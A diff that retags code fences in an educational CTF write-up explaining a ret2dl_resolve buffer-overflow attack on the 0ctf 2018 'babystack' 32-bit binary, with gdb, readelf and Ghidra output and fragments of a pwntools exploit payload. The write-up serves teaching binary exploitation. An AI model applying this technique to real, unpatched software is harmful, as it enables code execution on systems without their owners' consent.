@@ -1,7 +1,7 @@
 # 0ctf 2018 Babystack
 
 This writeup is based off of these resources:
-```
+```text
 https://github.com/sajjadium/ctf-writeups/tree/master/0CTFQuals/2018/babystack
 https://kileak.github.io/ctf/2018/0ctf-qual-babystack/
 ```
@@ -10,7 +10,7 @@ The objective of this challenge is to pop a shell, but without using an infoleak
 
 Let's take a look at the binary:
 
-```
+```console
 $    file babystack
 babystack: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=76b50d733400542b34d5e8fa23f0f12dc951d4ef, stripped
 $    pwn checksec babystack
@@ -30,7 +30,7 @@ So we can see that we are dealing with a `32` bit elf, that has a Non-Executable
 
 When we take a look at the binary in Ghidra, we don't immediately see a `main` function. However we see this function at `0x0804843b`:
 
-```
+```c
 void scanInput(void)
 
 {
@@ -54,7 +54,7 @@ So dynamically linked binaries are linked with a libc file when they are execute
 Elf binaries use something called `Delayed Binding`, which means that the linking process happens when the binary first tries to execute a libc function. To understand that, let's look at what the GOT addresses are for `read` before it is called:
 
 Got table entries for `read` and `alarm` in `.got.plt`:
-```
+```nasm
                              PTR_read_0804a00c                               XREF[1]:     read:08048300  
         0804a00c 00 b0 04 08     addr       read                                             = ??
                              PTR_alarm_0804a010                              XREF[1]:     alarm:08048310  
@@ -63,7 +63,7 @@ Got table entries for `read` and `alarm` in `.got.plt`:
 
 Now let's see what it is
 
-```
+```gdb
 gef➤  b *0x804844c
 Breakpoint 1 at 0x804844c
 gef➤  r
@@ -133,7 +133,7 @@ gef➤  x/6i 0x8048300
 
 So we can see that the got entry for read points to `read@plt+6`. For the `read@plt` function, we can see that it starts off by jumping to whatever value is stored in the got entry for `read` (stored at `0x804a00c`). Proceeding that it will push `0x0` on to the stack (offset for the read symbol), and jump to `0x80482f0`. When we look at `0x80482f0` we see this:
 
-```
+```gdb
 gef➤  x/10i 0x80482f0
    0x80482f0:    push   DWORD PTR ds:0x804a004
    0x80482f6:    jmp    DWORD PTR ds:0x804a008
@@ -148,7 +148,7 @@ gef➤  x/w 0x804a008
 
 So we can see it pushes the DWORD stored at `0x804a004` onto the stack. Then it jumps to the instruction pointer stored in `0x804a008`. This function is `_dl_runtime_resolve`, and the value pushed before it is the link map. Even though there isn't a symbol for `_dl_runtime_resolve`, we can see that it's address is in the middle of some `_dl` functions:
 
-```
+```gdb
 gef➤  info functions
 All defined functions:
 
@@ -164,7 +164,7 @@ All defined functions:
 
 We can actually see the `_dl_runtime_resolve` function here:
 
-```
+```gdb
 gef➤  x/11i 0xf7fe9780
    0xf7fe9780:    push   eax
    0xf7fe9781:    push   ecx
@@ -183,7 +183,7 @@ When it goes through the process of linking the function, it needs to actually k
 
 After `read@plt` is executed we can see that the got entry points to the libc address for `read`. That way whenever `read@plt` is called again, it will just jump to the got entry for it, which will be a libc address:
 
-```
+```gdb
 ──────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
     0x804846d                  call   0x8048310 <alarm@plt>
     0x8048472                  add    esp, 0x10
@@ -215,7 +215,7 @@ Our attack will be to essentially create a fake symbols table (`symtab`), with a
 
 So to scan in the full payload for the `ret2dl`, we won't be able to fit it into the initial `64` bytes worth of data. So we will have to be making another call to `read`. We will be scanning it into `0x804a020`, which is the start of the `bss`. This is where we will store the things needed for the `ret_2_dl_reslove`:
 
-```
+```python
 payload0 += "0"*44                        # Filler from start of input to return address
 payload0 += p32(elf.symbols['read'])    # Return read
 payload0 += scanInput                    # After the read call, return to scan input
@@ -230,7 +230,7 @@ After that, we will jump back to the `scanInput` function, so we can re-exploit 
 
 Now to actually execute the attack, we will be needing to create some fake entries. First, let's take a look at all of the sections in this binary. Also just to be clear, our goal is to run the libc `system` function:
 
-```
+```console
 $    readelf -S babystack
 There are 29 section headers, starting at offset 0x1150:
 
@@ -269,7 +269,7 @@ Section Headers:
 
 We will be creating entries for the following sections:
 
-```
+```text
 .rel.plt     (Elf_Rel entry)
 .dynsym     (Elf_Sym entry)
 .dynstr
@@ -279,7 +279,7 @@ We will be creating entries for the following sections:
 
 The `.rel.plt` section is used for function relocation. The `.rel.dyn` is used for variable relocation. Let's take a look at this section:
 
-```
+```console
 $    readelf -r babystack
 
 Relocation section '.rel.dyn' at offset 0x2a8 contains 1 entry:
@@ -295,7 +295,7 @@ Relocation section '.rel.plt' at offset 0x2b0 contains 3 entries:
 
 And in memory:
 
-```
+```gdb
 gef➤  x/8w 0x80482a8
 0x80482a8:    0x08049ffc    0x00000306    0x0804a00c    0x00000107
 0x80482b8:    0x0804a010    0x00000207    0x0804a014    0x00000407
@@ -307,7 +307,7 @@ gef➤  x/w 0x804a010
 
 Also let's look at the code for one of the entries:
 
-```
+```text
   Typedef struct {
   Elf32_Addr r_offset; // got.plt entry
   Elf32_Word r_info; // index from symbol table
@@ -324,7 +324,7 @@ For the `r_info` value (which is the index to the `dynsm` entry), we will be nee
 
 This section contains a dynamic symbol link table. Let's take a look at this section of the binary in Ghidra:
 
-```
+```nasm
                              //
                              // .dynsym
                              // SHT_DYNSYM  [0x80481cc - 0x804822b]
@@ -370,7 +370,7 @@ Now for the values stored in the various entries that `r_info` maps to. Each ent
 
 Now this section contains the strings for the symbols that we want to link. When we take a look at this section of the binary in Ghidra, we see this:
 
-```
+```nasm
                              //
                              // .dynstr
                              // SHT_STRTAB  [0x804822c - 0x804827b]
@@ -412,7 +412,7 @@ So that will be the entries we store in the bss. We are ready to actually execut
 
 Bringing it all together, we have the following exploit:
 
-```
+```python
 # This exploit is based off of: https://github.com/sajjadium/ctf-writeups/tree/master/0CTFQuals/2018/babystack
 
 from pwn import *
@@ -517,7 +517,7 @@ target.interactive()
 
 When we run it:
 
-```
+```console
 $    python exploit.py
 [+] Starting local process './babystack': pid 10847
 [*] '/Hackery/pod/modules/ret2_csu_dl/0ctf18_babystack/babystack'
